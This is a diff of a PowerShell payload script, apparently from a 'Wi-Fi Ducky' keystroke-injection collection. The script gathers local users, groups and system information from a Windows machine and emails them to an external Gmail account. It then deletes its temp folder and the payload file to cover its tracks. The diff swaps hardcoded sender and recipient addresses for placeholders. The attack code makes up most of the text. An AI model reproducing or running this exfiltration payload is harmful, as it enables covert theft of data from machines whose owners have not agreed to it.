@@ -1,3 +1,10 @@
+# Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+# Description: Powershell Script to collect data on the local machine and email it to a external source (Gmail)
+
+# <SENDER EMAIL ADDRESS> - Gmail account of the sender
+# <SENDER PASSWORD> - Gmail account password
+# <RECEPIENT EMAIL ADDRESS> - Recepient email address (Can be same as sender)
+
 # Set Directory
 $path = "C:\temp\234f23"
 If(!(test-path $path))
@@ -21,9 +28,9 @@ Get-LocalGroup | Out-File -Append $filename
 Get-Computerinfo | Out-File -append $filename
 
 # Email results
-$FROM = "plextitannewsletter@gmail.com"
-$PASS = ""
-$TO = "b.streber@protonmail.com"
+$FROM = "<SENDER EMAIL ADDRESS>"
+$PASS = "<SENDER PASSWORD>"
+$TO = "<RECEPIENT EMAIL ADDRESS>"
 
 $PC_NAME = "$env:computername"
 $SUBJECT = "Wi-Fi Ducky Data Collection - " + $PC_NAME
@@ -39,5 +46,4 @@ Remove-Item -Path 'C:\temp\234f23' -Recurse -Force
 
 
 # remove ducky payload
-Set-location
 Remove-Item d.ps1
